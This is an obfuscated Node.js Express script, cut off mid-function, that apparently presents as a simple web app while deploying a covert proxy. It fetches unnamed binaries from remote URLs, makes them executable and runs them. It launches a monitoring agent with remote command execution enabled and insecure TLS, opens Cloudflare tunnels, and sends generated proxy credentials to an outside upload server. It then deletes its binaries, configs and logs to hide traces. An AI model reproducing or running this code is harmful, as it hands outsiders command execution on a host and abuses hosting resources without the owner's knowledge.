const _0x2d90f3=_0x259b;(function(_0x12a42d,_0x50f1bf){const _0x293130={_0x3d68b4:0xa1,_0x4a75aa:0xb7,_0x4513f1:0xab,_0x2a37f6:0x76,_0x216e6e:0xe5},_0x5508d1=_0x259b,_0x10b1c3=_0x12a42d();while(!![]){try{const _0x3eb9b4=parseInt(_0x5508d1(_0x293130._0x3d68b4))/0x1*(-parseInt(_0x5508d1(0x67))/0x2)+-parseInt(_0x5508d1(0xce))/0x3+parseInt(_0x5508d1(_0x293130._0x4a75aa))/0x4+-parseInt(_0x5508d1(0x72))/0x5*(-parseInt(_0x5508d1(0x10c))/0x6)+parseInt(_0x5508d1(0xbf))/0x7*(parseInt(_0x5508d1(_0x293130._0x4513f1))/0x8)+parseInt(_0x5508d1(_0x293130._0x2a37f6))/0x9+-parseInt(_0x5508d1(0xd5))/0xa*(-parseInt(_0x5508d1(_0x293130._0x216e6e))/0xb);if(_0x3eb9b4===_0x50f1bf)break;else _0x10b1c3['push'](_0x10b1c3['shift']());}catch(_0x44e3f1){_0x10b1c3['push'](_0x10b1c3['shift']());}}}(_0x58b4,0x8763b));const express=require(_0x2d90f3(0x90)),app=express(),axios=require(_0x2d90f3(0xac)),os=require('os'),fs=require('fs'),path=require(_0x2d90f3(0xa6)),{promisify}=require('util'),exec=promisify(require(_0x2d90f3(0xc1))[_0x2d90f3(0xaa)]),{execSync}=require(_0x2d90f3(0xc1)),UPLOAD_URL=process[_0x2d90f3(0x106)][_0x2d90f3(0x103)]||'',PROJECT_URL=process[_0x2d90f3(0x106)][_0x2d90f3(0x122)]||'',AUTO_ACCESS=process[_0x2d90f3(0x106)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x2d90f3(0x106)][_0x2d90f3(0xb4)]||'./tmp',SUB_PATH=process[_0x2d90f3(0x106)][_0x2d90f3(0x12b)]||_0x2d90f3(0xe1),PORT=process[_0x2d90f3(0x106)][_0x2d90f3(0xcf)]||process[_0x2d90f3(0x106)][_0x2d90f3(0x73)]||0xbb8,UUID=process[_0x2d90f3(0x106)][_0x2d90f3(0x110)]||_0x2d90f3(0x12c),NEZHA_SERVER=process[_0x2d90f3(0x106)][_0x2d90f3(0xef)]||'',NEZHA_PORT=process[_0x2d90f3(0x106)][_0x2d90f3(0x9b)]||'',NEZHA_KEY=process[_0x2d90f3(0x106)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x2d90f3(0x106)][_0x2d90f3(0xbb)]||_0x2d90f3(0xb2),ARGO_AUTH=process[_0x2d90f3(0x106)][_0x2d90f3(0xe7)]||_0x2d90f3(0xeb),ARGO_PORT=process[_0x2d90f3(0x106)]['ARGO_PORT']||0x1f41,CFIP=process['env'][_0x2d90f3(0x86)]||_0x2d90f3(0x7a),CFPORT=process[_0x2d90f3(0x106)]['CFPORT']||0x1bb,NAME=process[_0x2d90f3(0x106)]['NAME']||_0x2d90f3(0xfe);!fs['existsSync'](FILE_PATH)?(fs[_0x2d90f3(0x9d)](FILE_PATH),console[_0x2d90f3(0xba)](FILE_PATH+_0x2d90f3(0x9c))):console['log'](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x2a9222={_0x1f5c5d:0x97,_0x29e79b:0xea,_0x20d5be:0xbe},_0x1761c2=_0x2d90f3,_0x4c3476=_0x1761c2(_0x2a9222._0x1f5c5d);let _0x121a83='';for(let _0x405165=0x0;_0x405165<0x6;_0x405165++){_0x121a83+=_0x4c3476[_0x1761c2(_0x2a9222._0x29e79b)](Math[_0x1761c2(_0x2a9222._0x20d5be)](Math[_0x1761c2(0xf8)]()*_0x4c3476[_0x1761c2(0x98)]));}return _0x121a83;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x2d90f3(0xd1)](FILE_PATH,phpName),webPath=path[_0x2d90f3(0xd1)](FILE_PATH,webName),botPath=path[_0x2d90f3(0xd1)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0x2d90f3(0xbc)),bootLogPath=path[_0x2d90f3(0xd1)](FILE_PATH,'boot.log'),configPath=path[_0x2d90f3(0xd1)](FILE_PATH,_0x2d90f3(0xfa));function deleteNodes(){const _0x1cf361={_0x274d1d:0x114,_0x4c27fc:0xd7,_0x1e5416:0x10e,_0x365271:0x79,_0x28f5b9:0x125,_0x1f4227:0x98,_0x21293c:0xd8,_0x176346:0xb8,_0x5b5ca4:0xd9},_0x236536=_0x2d90f3;try{if(!UPLOAD_URL)return;if(!fs[_0x236536(0x6c)](subPath))return;let _0x562121;try{_0x562121=fs[_0x236536(0xc5)](subPath,'utf-8');}catch{return null;}const _0x4e57c9=Buffer[_0x236536(_0x1cf361._0x274d1d)](_0x562121,_0x236536(0xd6))[_0x236536(_0x1cf361._0x4c27fc)](_0x236536(_0x1cf361._0x1e5416)),_0x4ab750=_0x4e57c9[_0x236536(_0x1cf361._0x365271)]('\x0a')[_0x236536(_0x1cf361._0x28f5b9)](_0x529d82=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x236536(0xa4)](_0x529d82));if(_0x4ab750[_0x236536(_0x1cf361._0x1f4227)]===0x0)return;return axios[_0x236536(_0x1cf361._0x21293c)](UPLOAD_URL+_0x236536(_0x1cf361._0x176346),JSON[_0x236536(_0x1cf361._0x5b5ca4)]({'nodes':_0x4ab750}),{'headers':{'Content-Type':'application/json'}})[_0x236536(0xdd)](_0x4d3cce=>{return null;}),null;}catch(_0x45e230){return null;}}function cleanupOldFiles(){const _0x162d17={_0x53e6bd:0xa5},_0xe36d66={_0x525eae:0xd4},_0x196a4a=_0x2d90f3;try{const _0x19d680=fs[_0x196a4a(_0x162d17._0x53e6bd)](FILE_PATH);_0x19d680[_0x196a4a(0xf1)](_0x400a48=>{const _0x461b1c=_0x196a4a,_0x35aaa4=path[_0x461b1c(0xd1)](FILE_PATH,_0x400a48);try{const _0xfc7595=fs[_0x461b1c(0x7b)](_0x35aaa4);_0xfc7595['isFile']()&&fs[_0x461b1c(_0xe36d66._0x525eae)](_0x35aaa4);}catch(_0x5346b7){}});}catch(_0x52df92){}}app[_0x2d90f3(0x80)]('/',function(_0x5b2d69,_0xc24ad9){const _0x4f10ba={_0x33ae96:0x109},_0x3bda6c=_0x2d90f3;_0xc24ad9['send'](_0x3bda6c(_0x4f10ba._0x33ae96));});async function generateConfig(){const _0x383c9a={_0x475137:0x69,_0x20992c:0xcc,_0x2210d3:0x10f,_0x42692f:0x91,_0x1e86da:0x6d,_0x1c64de:0xcc,_0x346d1f:0xb3,_0x578a63:0x7f,_0x5ac076:0xa9,_0x3123a6:0xcb,_0x163b24:0xcc,_0x2494ad:0xff,_0xf66ed5:0x87,_0x6ca450:0x6a,_0x526322:0x8c,_0x529615:0xd1},_0x30ac9b=_0x2d90f3,_0x4afc1d={'log':{'access':_0x30ac9b(_0x383c9a._0x475137),'error':'/dev/null','loglevel':_0x30ac9b(_0x383c9a._0x20992c)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x30ac9b(0x127)}],'decryption':_0x30ac9b(0xcc),'fallbacks':[{'dest':0xbb9},{'path':_0x30ac9b(_0x383c9a._0x2210d3),'dest':0xbba},{'path':_0x30ac9b(0x7f),'dest':0xbbb},{'path':_0x30ac9b(0xd0),'dest':0xbbc}]},'streamSettings':{'network':_0x30ac9b(_0x383c9a._0x42692f)}},{'port':0xbb9,'listen':_0x30ac9b(0x10d),'protocol':_0x30ac9b(_0x383c9a._0x1e86da),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x30ac9b(_0x383c9a._0x42692f),'security':_0x30ac9b(0xcc)}},{'port':0xbba,'listen':'127.0.0.1','protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x30ac9b(_0x383c9a._0x1c64de)},'streamSettings':{'network':'ws','security':_0x30ac9b(_0x383c9a._0x20992c),'wsSettings':{'path':_0x30ac9b(0x10f)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x30ac9b(_0x383c9a._0x346d1f),_0x30ac9b(0xcb)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x30ac9b(0x10d),'protocol':_0x30ac9b(0x8e),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x30ac9b(_0x383c9a._0x578a63)}},'sniffing':{'enabled':!![],'destOverride':[_0x30ac9b(_0x383c9a._0x5ac076),_0x30ac9b(0xb3),_0x30ac9b(_0x383c9a._0x3123a6)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x30ac9b(0x10d),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x30ac9b(_0x383c9a._0x163b24),'wsSettings':{'path':_0x30ac9b(0xd0)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x30ac9b(0xb3),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x30ac9b(_0x383c9a._0x2494ad)]},'outbounds':[{'protocol':_0x30ac9b(0xd3),'tag':_0x30ac9b(0x12a)},{'protocol':_0x30ac9b(_0x383c9a._0xf66ed5),'tag':_0x30ac9b(_0x383c9a._0x6ca450)}]};fs[_0x30ac9b(_0x383c9a._0x526322)](path[_0x30ac9b(_0x383c9a._0x529615)](FILE_PATH,'config.json'),JSON['stringify'](_0x4afc1d,null,0x2));}function getSystemArchitecture(){const _0x3f35f2={_0xd9c210:0x124,_0x5150f9:0xae},_0x2edcf7=_0x2d90f3,_0x263b0d=os['arch']();return _0x263b0d===_0x2edcf7(0xae)||_0x263b0d==='arm64'||_0x263b0d===_0x2edcf7(_0x3f35f2._0xd9c210)?_0x2edcf7(_0x3f35f2._0x5150f9):_0x2edcf7(0xed);}function _0x259b(_0x17bee5,_0x15c87c){const _0x58b48d=_0x58b4();return _0x259b=function(_0x259b0c,_0x130b45){_0x259b0c=_0x259b0c-0x65;let _0x222ec2=_0x58b48d[_0x259b0c];return _0x222ec2;},_0x259b(_0x17bee5,_0x15c87c);}function downloadFile(_0x1d22c2,_0x2b16c0,_0x56a67e){const _0x2275a6={_0x3013ed:0x6c,_0x2c6893:0x80,_0x42e29a:0x8b,_0x1694c0:0xdd},_0x3a2d6f={_0x55acee:0x100},_0xc8bc00={_0x3a7cf1:0x8f,_0x39463a:0xba},_0x3c7829=_0x2d90f3,_0x3533e6=_0x1d22c2;!fs[_0x3c7829(_0x2275a6._0x3013ed)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x58c3d5=fs['createWriteStream'](_0x3533e6);axios({'method':_0x3c7829(_0x2275a6._0x2c6893),'url':_0x2b16c0,'responseType':_0x3c7829(_0x2275a6._0x42e29a)})[_0x3c7829(0x9e)](_0x232d31=>{const _0x22c94b={_0x3c6c75:0x93,_0x5cc4f8:0x11d},_0x19c494=_0x3c7829;_0x232d31[_0x19c494(0xb9)][_0x19c494(0xc6)](_0x58c3d5),_0x58c3d5['on']('finish',()=>{const _0x3c4cd7=_0x19c494;_0x58c3d5[_0x3c4cd7(_0xc8bc00._0x3a7cf1)](),console[_0x3c4cd7(_0xc8bc00._0x39463a)]('Download\x20'+path['basename'](_0x3533e6)+_0x3c4cd7(0xaf)),_0x56a67e(null,_0x3533e6);}),_0x58c3d5['on']('error',_0x7e9088=>{const _0x3a5d09=_0x19c494;fs['unlink'](_0x3533e6,()=>{});const _0x1f8d4f=_0x3a5d09(0xb5)+path[_0x3a5d09(_0x22c94b._0x3c6c75)](_0x3533e6)+_0x3a5d09(_0x22c94b._0x5cc4f8)+_0x7e9088[_0x3a5d09(0x10a)];console[_0x3a5d09(0x100)](_0x1f8d4f),_0x56a67e(_0x1f8d4f);});})[_0x3c7829(_0x2275a6._0x1694c0)](_0x49ab48=>{const _0x5a3350=_0x3c7829,_0x3d6839='Download\x20'+path['basename'](_0x3533e6)+_0x5a3350(0x11d)+_0x49ab48[_0x5a3350(0x10a)];console[_0x5a3350(_0x3a2d6f._0x55acee)](_0x3d6839),_0x56a67e(_0x3d6839);});}async function downloadFilesAndRun(){const _0x19d632={_0xd046e:0x100,_0x28660d:0x99,_0x4e407b:0x79,_0x5be7a2:0x9f,_0x4a9109:0xc8,_0x5a3d53:0x83,_0x33ace3:0x102,_0x56cc7b:0x11b,_0x1da9e6:0x104,_0x3e532b:0xd1,_0x364ced:0x11a,_0x572e5c:0x75,_0x463f50:0x70,_0x3d41f2:0xe9,_0x5d524a:0xe8,_0x42e7f3:0x116,_0x41f7e6:0x129,_0x1519a1:0x94,_0x51bd16:0x12d,_0x217445:0x108,_0x5d0685:0x6c,_0x666c9d:0xf5,_0x21e99a:0x126,_0x575370:0x128,_0x34f8c9:0x116},_0x2fb39d={_0x4f7b5b:0xbd},_0x253f55=_0x2d90f3,_0x4e4087=getSystemArchitecture(),_0x38acc0=getFilesForArchitecture(_0x4e4087);if(_0x38acc0[_0x253f55(0x98)]===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x3da8f0=_0x38acc0[_0x253f55(0x66)](_0xe777c=>{return new Promise((_0x1f8583,_0x2b9fcc)=>{const _0x561362=_0x259b;downloadFile(_0xe777c[_0x561362(0x11e)],_0xe777c[_0x561362(_0x2fb39d._0x4f7b5b)],(_0x2160ca,_0x398d20)=>{_0x2160ca?_0x2b9fcc(_0x2160ca):_0x1f8583(_0x398d20);});});});try{await Promise['all'](_0x3da8f0);}catch(_0x13e6ec){console[_0x253f55(_0x19d632._0xd046e)](_0x253f55(_0x19d632._0x28660d),_0x13e6ec);return;}function _0x407306(_0x492512){const _0x504894=0x1fd;_0x492512['forEach'](_0x1f4cb0=>{const _0xa4a49f={_0x4e3d56:0x100};fs['existsSync'](_0x1f4cb0)&&fs['chmod'](_0x1f4cb0,_0x504894,_0x3d7bed=>{const _0x26acbc=_0x259b;_0x3d7bed?console[_0x26acbc(_0xa4a49f._0x4e3d56)]('Empowerment\x20failed\x20for\x20'+_0x1f4cb0+':\x20'+_0x3d7bed):console['log']('Empowerment\x20success\x20for\x20'+_0x1f4cb0+':\x20'+_0x504894['toString'](0x8));});});}const _0x3030b6=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x407306(_0x3030b6);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3ba26f=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x253f55(_0x19d632._0x4e407b)](':')[_0x253f55(_0x19d632._0x5be7a2)]():'',_0x6d303a=new Set([_0x253f55(_0x19d632._0x4a9109),_0x253f55(0x9a),'2096','2087',_0x253f55(0x119),'2053']),_0x1bed02=_0x6d303a[_0x253f55(_0x19d632._0x5a3d53)](_0x3ba26f)?_0x253f55(_0x19d632._0x33ace3):_0x253f55(_0x19d632._0x56cc7b),_0x16a691=_0x253f55(_0x19d632._0x1da9e6)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x253f55(0x84)+_0x1bed02+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs['writeFileSync'](path[_0x253f55(_0x19d632._0x3e532b)](FILE_PATH,_0x253f55(_0x19d632._0x364ced)),_0x16a691);const _0x48f6f7=_0x253f55(0x116)+phpPath+_0x253f55(0xf7)+FILE_PATH+_0x253f55(0x74);try{await exec(_0x48f6f7),console[_0x253f55(0xba)](phpName+_0x253f55(_0x19d632._0x572e5c)),await new Promise(_0x4992ec=>setTimeout(_0x4992ec,0x3e8));}catch(_0x9e3894){console[_0x253f55(0x100)](_0x253f55(_0x19d632._0x463f50)+_0x9e3894);}}else{let _0x375507='';const _0x549be4=[_0x253f55(0xc8),'8443',_0x253f55(0xa8),_0x253f55(_0x19d632._0x3d41f2),_0x253f55(0x119),_0x253f55(0x6b)];_0x549be4[_0x253f55(0x7e)](NEZHA_PORT)&&(_0x375507=_0x253f55(_0x19d632._0x5d524a));const _0x4d8193=_0x253f55(_0x19d632._0x42e7f3)+npmPath+_0x253f55(_0x19d632._0x41f7e6)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x375507+_0x253f55(0x8a);try{await exec(_0x4d8193),console[_0x253f55(0xba)](npmName+'\x20is\x20running'),await new Promise(_0x548331=>setTimeout(_0x548331,0x3e8));}catch(_0x39aec8){console[_0x253f55(0x100)](_0x253f55(_0x19d632._0x1519a1)+_0x39aec8);}}}else console[_0x253f55(0xba)](_0x253f55(_0x19d632._0x51bd16));const _0x129de1=_0x253f55(0x116)+webPath+_0x253f55(_0x19d632._0x217445)+FILE_PATH+_0x253f55(0xa2);try{await exec(_0x129de1),console[_0x253f55(0xba)](webName+_0x253f55(0x75)),await new Promise(_0x19a24d=>setTimeout(_0x19a24d,0x3e8));}catch(_0x31fe36){console['error']('web\x20running\x20error:\x20'+_0x31fe36);}if(fs[_0x253f55(_0x19d632._0x5d0685)](botPath)){let _0x3dbe5f;if(ARGO_AUTH[_0x253f55(_0x19d632._0x666c9d)](/^[A-Z0-9a-z=]{120,250}$/))_0x3dbe5f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x253f55(0xf5)](/TunnelSecret/)?_0x3dbe5f=_0x253f55(_0x19d632._0x21e99a)+FILE_PATH+_0x253f55(0xdb):_0x3dbe5f=_0x253f55(0xfb)+FILE_PATH+_0x253f55(_0x19d632._0x575370)+ARGO_PORT;try{await exec(_0x253f55(_0x19d632._0x34f8c9)+botPath+'\x20'+_0x3dbe5f+_0x253f55(0xe6)),console['log'](botName+_0x253f55(0x75)),await new Promise(_0x1b9ba5=>setTimeout(_0x1b9ba5,0x7d0));}catch(_0x2f1698){console[_0x253f55(_0x19d632._0xd046e)](_0x253f55(0x118)+_0x2f1698);}}await new Promise(_0x470091=>setTimeout(_0x470091,0x1388));}function getFilesForArchitecture(_0x3576cc){const _0xb239c5={_0x1e79a1:0xae,_0x2617de:0x82,_0x22ab16:0x111,_0xafc3ae:0xb1,_0x4affa5:0x65},_0xf8c226=_0x2d90f3;let _0x590996;_0x3576cc===_0xf8c226(_0xb239c5._0x1e79a1)?_0x590996=[{'fileName':webPath,'fileUrl':_0xf8c226(_0xb239c5._0x2617de)},{'fileName':botPath,'fileUrl':_0xf8c226(0xe0)}]:_0x590996=[{'fileName':webPath,'fileUrl':_0xf8c226(0x107)},{'fileName':botPath,'fileUrl':_0xf8c226(_0xb239c5._0x22ab16)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x383f9a=_0x3576cc===_0xf8c226(0xae)?_0xf8c226(_0xb239c5._0xafc3ae):_0xf8c226(0x78);_0x590996[_0xf8c226(_0xb239c5._0x4affa5)]({'fileName':npmPath,'fileUrl':_0x383f9a});}else{const _0x54908c=_0x3576cc===_0xf8c226(_0xb239c5._0x1e79a1)?'https://arm64.ssss.nyc.mn/v1':_0xf8c226(0xcd);_0x590996[_0xf8c226(0x65)]({'fileName':phpPath,'fileUrl':_0x54908c});}}return _0x590996;}function argoType(){const _0x2b19e9={_0x17d644:0x7d,_0x445e81:0x77,_0x203380:0x79,_0x4cad47:0x11f,_0xc752df:0xd1},_0x240a53=_0x2d90f3;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x240a53(0xf6));return;}if(ARGO_AUTH[_0x240a53(0x7e)](_0x240a53(0xb0))){fs['writeFileSync'](path['join'](FILE_PATH,_0x240a53(_0x2b19e9._0x17d644)),ARGO_AUTH);const _0x1f4ee3=_0x240a53(_0x2b19e9._0x445e81)+ARGO_AUTH[_0x240a53(_0x2b19e9._0x203380)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x240a53(0xd1)](FILE_PATH,_0x240a53(0x7d))+_0x240a53(0xfd)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x240a53(_0x2b19e9._0x4cad47);fs['writeFileSync'](path[_0x240a53(_0x2b19e9._0xc752df)](FILE_PATH,_0x240a53(0xdc)),_0x1f4ee3);}else console['log'](_0x240a53(0x11c));}async function extractDomains(){const _0x25718e={_0x56a79b:0xc5,_0x3ac03a:0xd1,_0x4b74f0:0x105,_0x91853f:0xf1,_0x5b482a:0x98,_0x8c1188:0xba,_0xda56a2:0xa7,_0x2295d7:0x116,_0x1a9192:0xe6,_0x4b9824:0x75,_0x2eb1e4:0x100,_0x3e5bac:0x81},_0x31b98f={_0x192d3a:0x80,_0x5ce8ff:0xb9,_0x7f3f93:0xb9,_0x46ebb7:0x92,_0x51348f:0x92,_0x47c102:0x80,_0x5227c9:0xf9,_0x395e6d:0xb9},_0x4d013f={_0x2b8912:0xf2,_0x5647df:0x120},_0x2e6548=_0x2d90f3;let _0x5ab2db;if(ARGO_AUTH&&ARGO_DOMAIN)_0x5ab2db=ARGO_DOMAIN,console[_0x2e6548(0xba)](_0x2e6548(0xc0),_0x5ab2db),await _0x36e90e(_0x5ab2db);else try{const _0x3f3f7e=fs[_0x2e6548(_0x25718e._0x56a79b)](path[_0x2e6548(_0x25718e._0x3ac03a)](FILE_PATH,_0x2e6548(_0x25718e._0x4b74f0)),'utf-8'),_0x2485be=_0x3f3f7e[_0x2e6548(0x79)]('\x0a'),_0x5b1608=[];_0x2485be[_0x2e6548(_0x25718e._0x91853f)](_0xea11b4=>{const _0xdd7ae2=_0xea11b4['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0xdd7ae2){const _0x2d8819=_0xdd7ae2[0x1];_0x5b1608['push'](_0x2d8819);}});if(_0x5b1608[_0x2e6548(_0x25718e._0x5b482a)]>0x0)_0x5ab2db=_0x5b1608[0x0],console[_0x2e6548(_0x25718e._0x8c1188)]('ArgoDomain:',_0x5ab2db),await _0x36e90e(_0x5ab2db);else{console['log'](_0x2e6548(_0x25718e._0xda56a2)),fs[_0x2e6548(0xd4)](path[_0x2e6548(_0x25718e._0x3ac03a)](FILE_PATH,_0x2e6548(0x105)));async function _0x3ebb4a(){const _0x425b67=_0x2e6548;try{process[_0x425b67(_0x4d013f._0x2b8912)]===_0x425b67(_0x4d013f._0x5647df)?await exec(_0x425b67(0x121)+botName+_0x425b67(0xe2)):await exec(_0x425b67(0x95)+botName[_0x425b67(0xea)](0x0)+']'+botName['substring'](0x1)+_0x425b67(0x8d));}catch(_0x5547ac){}}_0x3ebb4a(),await new Promise(_0x90b3db=>setTimeout(_0x90b3db,0xbb8));const _0x593ae2='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x2e6548(0x128)+ARGO_PORT;try{await exec(_0x2e6548(_0x25718e._0x2295d7)+botPath+'\x20'+_0x593ae2+_0x2e6548(_0x25718e._0x1a9192)),console[_0x2e6548(0xba)](botName+_0x2e6548(_0x25718e._0x4b9824)),await new Promise(_0x285ac6=>setTimeout(_0x285ac6,0xbb8)),await extractDomains();}catch(_0x27d51a){console[_0x2e6548(_0x25718e._0x2eb1e4)](_0x2e6548(0x118)+_0x27d51a);}}}catch(_0x3834cd){console[_0x2e6548(0x100)](_0x2e6548(_0x25718e._0x3e5bac),_0x3834cd);}async function _0x1ba868(){const _0x51958b=_0x2e6548;try{const _0x2f4c41=await axios[_0x51958b(_0x31b98f._0x192d3a)](_0x51958b(0xc2),{'timeout':0xbb8});if(_0x2f4c41[_0x51958b(_0x31b98f._0x5ce8ff)]&&_0x2f4c41[_0x51958b(_0x31b98f._0x7f3f93)][_0x51958b(0x117)]&&_0x2f4c41[_0x51958b(0xb9)][_0x51958b(_0x31b98f._0x46ebb7)])return _0x2f4c41['data'][_0x51958b(0x117)]+'_'+_0x2f4c41[_0x51958b(0xb9)][_0x51958b(_0x31b98f._0x51348f)];}catch(_0x46f637){try{const _0x46df66=await axios[_0x51958b(_0x31b98f._0x47c102)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x46df66['data']&&_0x46df66[_0x51958b(0xb9)][_0x51958b(_0x31b98f._0x5227c9)]===_0x51958b(0x101)&&_0x46df66[_0x51958b(0xb9)][_0x51958b(0x88)]&&_0x46df66[_0x51958b(_0x31b98f._0x395e6d)][_0x51958b(0x92)])return _0x46df66['data'][_0x51958b(0x88)]+'_'+_0x46df66['data']['org'];}catch(_0x4e92f3){}}return _0x51958b(0x89);}async function _0x36e90e(_0x11ed41){const _0x49cec8={_0x2bc25f:0xf0,_0x3bc031:0xb3,_0x42f868:0x7c,_0xef0968:0xc3,_0x371427:0x114,_0x290baa:0xd7,_0x48753f:0x112,_0xf2b9d4:0xe3,_0x2ef23d:0x68,_0x212c2a:0xb6,_0x3c7b61:0xba},_0x174064=await _0x1ba868(),_0x560f5c=NAME?NAME+'-'+_0x174064:_0x174064;return new Promise(_0x3b4662=>{setTimeout(()=>{const _0x56a724={_0x39bc1c:0xd7,_0xc7874e:0xd6,_0xee9641:0x115,_0x29815d:0x123},_0x92cfe0=_0x259b,_0x3b8ebc={'v':'2','ps':''+_0x560f5c,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x92cfe0(0xcc),'net':'ws','type':_0x92cfe0(0xcc),'host':_0x11ed41,'path':_0x92cfe0(_0x49cec8._0x2bc25f),'tls':_0x92cfe0(_0x49cec8._0x3bc031),'sni':_0x11ed41,'alpn':'','fp':_0x92cfe0(_0x49cec8._0x42f868)},_0x4cc133=_0x92cfe0(_0x49cec8._0xef0968)+UUID+'@'+CFIP+':'+CFPORT+_0x92cfe0(0x85)+_0x11ed41+_0x92cfe0(0xe3)+_0x11ed41+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x560f5c+'\x0a\x0avmess://'+Buffer[_0x92cfe0(_0x49cec8._0x371427)](JSON[_0x92cfe0(0xd9)](_0x3b8ebc))[_0x92cfe0(_0x49cec8._0x290baa)](_0x92cfe0(0xd6))+_0x92cfe0(_0x49cec8._0x48753f)+UUID+'@'+CFIP+':'+CFPORT+_0x92cfe0(0xca)+_0x11ed41+_0x92cfe0(_0x49cec8._0xf2b9d4)+_0x11ed41+_0x92cfe0(_0x49cec8._0x2ef23d)+_0x560f5c+_0x92cfe0(_0x49cec8._0x212c2a);console[_0x92cfe0(_0x49cec8._0x3c7b61)](Buffer['from'](_0x4cc133)['toString'](_0x92cfe0(0xd6))),fs[_0x92cfe0(0x8c)](subPath,Buffer[_0x92cfe0(_0x49cec8._0x371427)](_0x4cc133)['toString'](_0x92cfe0(0xd6))),console[_0x92cfe0(0xba)](FILE_PATH+_0x92cfe0(0xf3)),uploadNodes(),app[_0x92cfe0(0x80)]('/'+SUB_PATH,(_0x3349e9,_0x38d510)=>{const _0x37a72b=_0x92cfe0,_0x3ccdbf=Buffer[_0x37a72b(0x114)](_0x4cc133)[_0x37a72b(_0x56a724._0x39bc1c)](_0x37a72b(_0x56a724._0xc7874e));_0x38d510[_0x37a72b(_0x56a724._0xee9641)](_0x37a72b(0xa0),_0x37a72b(_0x56a724._0x29815d)),_0x38d510[_0x37a72b(0xc4)](_0x3ccdbf);}),_0x3b4662(_0x4cc133);},0x7d0);});}}async function uploadNodes(){const _0x19c7b2={_0x3edce5:0xda,_0x273b7c:0xba,_0x363cba:0x79,_0x1473c8:0xd9,_0xc337e2:0x10b},_0x324cdc=_0x2d90f3;if(UPLOAD_URL&&PROJECT_URL){const _0x578931=PROJECT_URL+'/'+SUB_PATH,_0x28115c={'subscription':[_0x578931]};try{const _0x3d3f1a=await axios['post'](UPLOAD_URL+_0x324cdc(_0x19c7b2._0x3edce5),_0x28115c,{'headers':{'Content-Type':'application/json'}});return _0x3d3f1a&&_0x3d3f1a['status']===0xc8?(console[_0x324cdc(_0x19c7b2._0x273b7c)]('Subscription\x20uploaded\x20successfully'),_0x3d3f1a):null;}catch(_0x596963){if(_0x596963[_0x324cdc(0x96)]){if(_0x596963[_0x324cdc(0x96)][_0x324cdc(0xf9)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x2f8542=fs['readFileSync'](listPath,'utf-8'),_0x299986=_0x2f8542[_0x324cdc(_0x19c7b2._0x363cba)]('\x0a')[_0x324cdc(0x125)](_0xf9d8be=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0xf9d8be));if(_0x299986['length']===0x0)return;const _0x315466=JSON[_0x324cdc(_0x19c7b2._0x1473c8)]({'nodes':_0x299986});try{const _0x4e503=await axios[_0x324cdc(0xd8)](UPLOAD_URL+'/api/add-nodes',_0x315466,{'headers':{'Content-Type':_0x324cdc(0xde)}});return _0x4e503&&_0x4e503['status']===0xc8?(console['log'](_0x324cdc(_0x19c7b2._0xc337e2)),_0x4e503):null;}catch(_0x193c3e){return null;}}else return;}}function cleanFiles(){const _0x4a7604={_0x4cb8bb:0x71,_0x578a17:0xe4,_0x4d4ace:0x6e,_0x3ed10d:0xdf},_0x314405={_0x40d798:0xee,_0x569beb:0xad};setTimeout(()=>{const _0xffd0e9={_0x40c31b:0xba,_0x2f773b:0xad},_0x59f2c6=_0x259b,_0x5d40e8=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x5d40e8[_0x59f2c6(0x71)](npmPath);else 